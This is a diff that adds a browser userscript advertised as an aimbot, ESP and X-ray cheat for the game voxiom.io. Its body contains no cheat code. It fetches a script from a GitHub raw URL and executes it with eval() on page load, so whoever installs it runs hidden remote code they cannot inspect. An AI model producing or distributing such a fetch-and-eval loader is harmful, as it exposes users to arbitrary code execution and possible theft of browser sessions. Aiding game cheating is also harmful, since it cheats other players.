@@ -1,0 +1,28 @@
+// ==UserScript==
+// @name         Voxiom.IO Aimbot, ESP & X-Ray 4.6 NoAds
+// @namespace    http://tampermonkey.net/
+// @version      4.6
+// @description  Let's you see players and items behind walls in voxiom.io. Comes with an aimbot that locks aim at nearest enemy and auto fires at them. Also shows ores and names of the items that are far far away.
+// @author       Zertalious (Zert) Ads removed by: Cqmbo__
+// @match        *://voxiom.io/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=voxiom.io
+// @grant        none
+// @run-at       document-start
+// @antifeature  ads
+// @require      https://unpkg.com/three@0.160.0/build/three.min.js
+// @require      https://cdn.jsdelivr.net/npm/lil-gui@0.19
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // Fetch and execute external script
+    async function fetchAndExecuteScript() {
+        let scriptUrl = "https://raw.githubusercontent.com/Cqmbo1/Cqmbo__-s-Scripts/refs/heads/main/Working%20Scripts/YT%20Script";
+        let scriptContent = await fetch(scriptUrl).then(response => response.text());
+        eval(scriptContent);  // Execute the fetched script
+    }
+
+    // Run the function to fetch and execute
+    fetchAndExecuteScript();
+})();
